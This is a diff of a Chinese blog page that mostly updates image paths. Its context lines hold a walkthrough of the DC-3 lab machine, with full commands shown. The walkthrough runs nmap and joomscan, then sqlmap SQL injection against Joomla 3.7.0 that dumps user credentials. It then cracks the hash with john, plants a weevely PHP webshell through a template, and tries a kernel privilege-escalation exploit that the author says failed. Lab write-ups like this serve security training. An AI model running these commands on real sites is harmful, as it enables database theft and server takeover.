@@ -457,28 +457,28 @@
 <p>使用nmap进行二层主机发现</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.153</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt></p>
 <h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168</span><span class="number">.153</span><span class="number">.153</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt></p>
 <p>发现80端口开放且运行Apache服务。</p>
 <p>我们网页访问IP的80端口</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt></p>
 <p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
 <h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
 <pre><code>不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl -u <span class="string">http:</span><span class="comment">//192.168.153.153</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt></p>
 <p>我们得到了该Joomla的具体版本号为3.7.0.</p>
 <h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt></p>
 <p>发现存在一个sql注入漏洞。</p>
 <p>我们将该漏洞文档复制到根目录下，然后打开。</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/exploitdb/</span>exploits<span class="meta-keyword">/php/</span>webapps/<span class="number">42033.</span>txt joomla-sql.txt</span><br><span class="line">cat joomla-sql.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt></p>
 <p>文档中给出了sqlmap自动注入的payload.</p>
 <h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
 <ul>
@@ -486,48 +486,48 @@
 </ul>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt></p>
 <p>查询当前使用数据库：</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt></p>
 <p>查询joomladb数据库下的表：</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt></p>
 <p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#_<span class="emphasis">_users" --columns  -p list[fullordering]</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt></p>
 <p>最后我们输出name,password的信息：</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u "<span class="link">http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#_<span class="emphasis">_users" -C "name,password" --dump  -p list[fullordering]</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt></p>
 <h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt></p>
 <p>使用dirsearch扫出后台文件</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt></p>
 <p>进入后台登录页面并登录</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt></p>
 <p>选择Templates模板，选择templates第一个模板即可，</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt></p>
 <p>用weevely生成php后门文件.</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt></p>
 <p>复制代码新建webshell.php文件，粘贴代码，保存</p>
 <p>然后用weevely连，成功拿到shell.</p>
 <h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
 <p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt></p>
 <p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt></p>
 <p>我们将exp下载下来然后经过一系列的解压后</p>
 <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">unzip</span> <span class="string">39772.zip </span></span><br><span class="line"></span><br><span class="line"><span class="attr">cd</span> <span class="string">39772</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tar</span> <span class="string">-xvf exploit.tar  </span></span><br><span class="line"></span><br><span class="line"><span class="attr">cd</span> <span class="string">ebpf_mapfd_doubleput_exploit</span></span><br></pre></td></tr></table></figure>
 
 <p>依次执行./compile.sh   </p>
 <p>​                ./doubleput</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p>
+<p><img src="/2020/03/12/dc-3-ba-ji/QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt></p>
 <p>但是不知道为什么一直没法成功。。。。。</p>
 
       
@@ -652,7 +652,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
